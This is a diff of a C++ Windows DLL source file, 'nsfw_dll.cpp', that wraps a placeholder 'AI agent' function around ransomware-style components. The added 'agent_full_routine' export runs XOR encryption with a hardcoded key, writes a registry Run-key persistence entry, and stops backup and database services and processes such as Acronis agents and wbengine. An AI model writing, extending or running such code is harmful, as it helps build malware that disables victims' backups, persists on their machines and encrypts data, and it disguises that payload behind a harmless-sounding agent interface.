@@ -1,3 +1,4 @@
+// nsfw_dll.cpp
 #include <windows.h>
 #include <wincrypt.h>
 #include <tlhelp32.h>
@@ -5,6 +6,14 @@
 #include <string>
 #include <iostream>
 #include <fstream>
+#include <cstring>
+
+// ==================== AI AGENT LOGIC ====================
+// Placeholder for your previous AI agent logic
+std::string process_input(const std::string& input) {
+    // Replace this with your actual AI logic
+    return "Processed: " + input;
+}
 
 // ==================== ENCRYPTION FUNCTIONS ====================
 
@@ -15,11 +24,11 @@ extern "C" __declspec(dllexport) void xor_encrypt(char* data, size_t length, con
     }
 }
 
-// AES Encryption (using Windows CryptoAPI)
+// AES Encryption (Windows CryptoAPI)
 extern "C" __declspec(dllexport) bool aes_encrypt(const BYTE* data, DWORD dataLen, BYTE* key, DWORD keyLen, BYTE* out, DWORD* outLen) {
-    HCRYPTPROV hProv;
-    HCRYPTKEY hKey;
-    HCRYPTHASH hHash;
+    HCRYPTPROV hProv = 0;
+    HCRYPTKEY hKey = 0;
+    HCRYPTHASH hHash = 0;
     bool success = false;
 
     if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
@@ -44,8 +53,7 @@ cleanup:
 
 // RC4 Encryption
 extern "C" __declspec(dllexport) void rc4_encrypt(BYTE* data, DWORD dataLen, BYTE* key, DWORD keyLen) {
-    BYTE S[256];
-    BYTE K[256];
+    BYTE S[256], K[256];
     int i, j = 0, t;
     BYTE temp;
 
@@ -74,7 +82,6 @@ extern "C" __declspec(dllexport) void rc4_encrypt(BYTE* data, DWORD dataLen, BYT
 }
 
 // ==================== REGISTRY PERSISTENCE ====================
-
 extern "C" __declspec(dllexport) bool add_persistence(const std::wstring& exePath) {
     HKEY hKey;
     LPCWSTR regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
@@ -86,15 +93,9 @@ extern "C" __declspec(dllexport) bool add_persistence(const std::wstring& exePat
     return lResult == ERROR_SUCCESS;
 }
 
-// ==================== KILL SERVICES/PROCESSES ====================
-
-std::vector<std::wstring> serviceNames = {
-    L"Acronis VSS Provider", L"Enterprise Client Service", /* ... all your service names ... */ L"MSSQLServerADHelper"
-};
-
-std::vector<std::wstring> processNames = {
-    L"AcronisAgent.exe", L"bedbg.exe", /* ... all your process .exe names ... */ L"wbengine.exe"
-};
+// ==================== KILL SERVICES / PROCESSES ====================
+std::vector<std::wstring> serviceNames = { L"Acronis VSS Provider", L"Enterprise Client Service" /* Add others */ };
+std::vector<std::wstring> processNames = { L"AcronisAgent.exe", L"bedbg.exe" /* Add others */ };
 
 extern "C" __declspec(dllexport) void kill_services_and_processes() {
     // Stop services
@@ -134,16 +135,47 @@ extern "C" __declspec(dllexport) void kill_services_and_processes() {
     }
 }
 
-// ==================== WINDOWS API WRAPPERS ====================
+// ==================== DLL EXPORTS ====================
 
-// Example: Wrapper for CryptAcquireContextW
-extern "C" __declspec(dllexport) bool acquire_crypto_context(HCRYPTPROV* hProv) {
-    return CryptAcquireContextW(hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
+// AI processing only
+extern "C" __declspec(dllexport) void agent_process(const char* input, char* output, size_t output_len) {
+    std::string result = process_input(std::string(input));
+    strncpy(output, result.c_str(), output_len - 1);
+    output[output_len - 1] = '\0';
 }
 
-// Example: Wrapper for RegOpenKeyExW
-extern "C" __declspec(dllexport) bool open_registry_key(HKEY hRoot, LPCWSTR subKey, PHKEY hKey) {
-    return RegOpenKeyExW(hRoot, subKey, 0, KEY_READ, hKey) == ERROR_SUCCESS;
+// AI + XOR encryption
+extern "C" __declspec(dllexport) void agent_process_and_encrypt(const char* input, char* output, size_t output_len, const char* key, size_t key_len) {
+    agent_process(input, output, output_len);
+    xor_encrypt(output, strlen(output), key, key_len);
 }
 
-// Add similar wrappers as needed for other listed APIs...
+// Full routine: AI + encryption + persistence + cleanup
+extern "C" __declspec(dllexport) void agent_full_routine(const char* input, char* output, size_t output_len) {
+    agent_process(input, output, output_len);
+
+    // Example XOR encryption
+    const char* key = "mykey123";
+    xor_encrypt(output, strlen(output), key, strlen(key));
+
+    // Add registry persistence
+    wchar_t exePath[MAX_PATH];
+    GetModuleFileNameW(NULL, exePath, MAX_PATH);
+    add_persistence(exePath);
+
+    // Kill blacklisted services/processes
+    kill_services_and_processes();
+}
+
+// DLL Entry Point
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
